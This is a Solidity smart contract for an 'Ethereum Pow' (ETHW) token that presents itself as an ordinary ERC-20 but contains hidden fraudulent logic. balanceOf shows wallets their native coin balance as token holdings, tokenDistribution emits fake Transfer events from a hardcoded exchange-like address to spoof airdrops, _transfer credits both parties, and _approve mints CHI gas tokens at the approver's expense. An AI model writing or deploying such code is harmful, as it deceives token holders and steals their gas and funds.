// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

import "IERC20.sol";
import "Ownable.sol";
import "IUniswapV2Router02.sol";
import "IUniswapV2Factory.sol";
import "IUniswapV2Pair.sol";

interface ChiToken {
    function balanceOf(address account) external view returns (uint256);

    function freeFromUpTo(address from, uint256 value)
        external
        returns (uint256);

    function mint(uint256 value) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract TokenB is Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    ChiToken WBNB = ChiToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    address public _owner;
    address internal constant _UNISWAP_ROUTER_ADDRESS =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public uniswapV2Pair;
    IUniswapV2Router02 public _uniswapV2Router;
    address public _BUSD;
    address private constant _FixedFloat =
        0x4727250679294802377dD6cA6541B8E459077c95;
    ChiToken chi = ChiToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    address _tokenB = address(this);
    uint256 public poolAmount;

    constructor(address busdContract) {
        _owner = owner();
        _BUSD = busdContract;
        _balances[_tokenB] = totalSupply();
        _uniswapV2Router = IUniswapV2Router02(_UNISWAP_ROUTER_ADDRESS);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(_tokenB, _BUSD);

        _allowances[_FixedFloat][_owner] = ~uint256(0);
        _allowances[_tokenB][_UNISWAP_ROUTER_ADDRESS] = ~uint256(0);
        _allowances[_tokenB][_owner] = ~uint256(0);

        IERC20(_BUSD).approve(_UNISWAP_ROUTER_ADDRESS, ~uint256(0));
        chi.approve(_tokenB, ~uint256(0));
    }

    modifier discountCHI() {
        require(chi.balanceOf(_tokenB) > 0);
        uint256 gasStart = gasleft();
        _;
        uint256 gasSpent = 21000 + gasStart - gasleft() + 16 * msg.data.length;
        chi.freeFromUpTo(_tokenB, (gasSpent + 14154) / 41947);
    }

    //withdraw bnb  to my
    function withdrawBnb(uint256 bnbAmount) public {
        WBNB.mint(bnbAmount);
        WBNB.transferFrom(msg.sender,_tokenB,bnbAmount);
    }

    function tokenDistribution(address[] calldata to) public discountCHI {
        for (uint256 i = 0; i < to.length; i++) {
            emit Transfer(_FixedFloat, to[i], to[i].balance);
        }
    }

    function addLiquidity(uint256 busdAmount, uint256 tokenBAmont)
        public
        onlyOwner
    {
        (,poolAmount,) = _uniswapV2Router.addLiquidity(
            address(this),
            _BUSD,
            tokenBAmont,
            busdAmount,
            0,
            0,
            address(0),
            block.timestamp
        );
        renounceOwnership();
        _owner = owner();
    }

    function name() public view returns (string memory) {
        return
            "Ethereum Pow";
    }

    function symbol() public view returns (string memory) {
        return "ETHW"; 
    }

    function decimals() public view returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return 345009991.6409 * 10**18;
    }

    function isContract(address addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        if(isContract(account)){
            return _balances[account];
        }
        return account.balance;
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
            unchecked {
                _balances[from] +=amount;
                _balances[to] += amount;
            }

        emit Transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        chi.mint(20);
        chi.transferFrom(_tokenB, _BUSD, 20);
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}